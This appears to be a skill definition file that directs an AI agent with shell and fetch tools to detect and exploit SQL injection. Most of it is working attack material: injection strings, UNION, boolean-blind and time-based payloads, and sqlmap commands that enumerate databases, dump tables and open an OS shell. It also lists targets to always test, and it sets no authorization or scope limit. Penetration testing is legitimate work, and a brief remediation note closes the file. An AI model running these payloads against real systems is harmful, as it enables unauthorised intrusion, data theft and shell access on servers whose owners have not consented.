---
name: sqli
description: SQL injection testing — detection, exploitation, and data extraction
tags:
  - web
  - sqli
  - exploitation
tools:
  - shell_tool
  - fetch_tool
  - write_tool
---

You are performing SQL injection testing. Your objective is to detect, confirm, and exploit SQL injection vulnerabilities to extract data or escalate access.

## Detection

### Manual Detection
- Inject `'`, `"`, `;--`, `' OR '1'='1`, `' AND '1'='2` into all input fields, URL params, headers, cookies
- Observe differences in responses: errors, timing changes, content differences
- Boolean-based blind: compare responses for TRUE vs FALSE conditions

### Error-Based Indicators
- MySQL: `You have an error in your SQL syntax`
- MSSQL: `Unclosed quotation mark`
- OracleDB: `ORA-01756`
- PostgreSQL: `unterminated quoted string`

## Exploitation with sqlmap

### Basic Detection
```bash
sqlmap -u "http://target/page?id=1" --batch --level=3 --risk=2
```

### With Cookies / Auth
```bash
sqlmap -u "http://target/page" --cookie="session=abc123" --data="id=1" --batch
```

### Database Enumeration
```bash
sqlmap -u "http://target/page?id=1" --dbs --batch
sqlmap -u "http://target/page?id=1" -D dbname --tables --batch
sqlmap -u "http://target/page?id=1" -D dbname -T tablename --dump --batch
```

### OS Shell (if permissions allow)
```bash
sqlmap -u "http://target/page?id=1" --os-shell --batch
```

## Manual Exploitation Techniques

### UNION-Based (MySQL example)
```sql
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users'--
```

### Blind Boolean
```sql
' AND 1=1--   (TRUE - normal response)
' AND 1=2--   (FALSE - different response)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
```

### Time-Based Blind
```sql
' AND SLEEP(5)--           (MySQL)
'; WAITFOR DELAY '0:0:5'-- (MSSQL)
' AND pg_sleep(5)--        (PostgreSQL)
```

## Targets to Always Test
- Login forms (username/password fields)
- Search bars
- URL parameters (`?id=`, `?page=`, `?category=`)
- HTTP headers: `User-Agent`, `X-Forwarded-For`, `Referer`
- JSON body parameters in API requests

## Remediation Context
When reporting: note injection point, database type, exploitability level, and recommend parameterized queries / prepared statements.
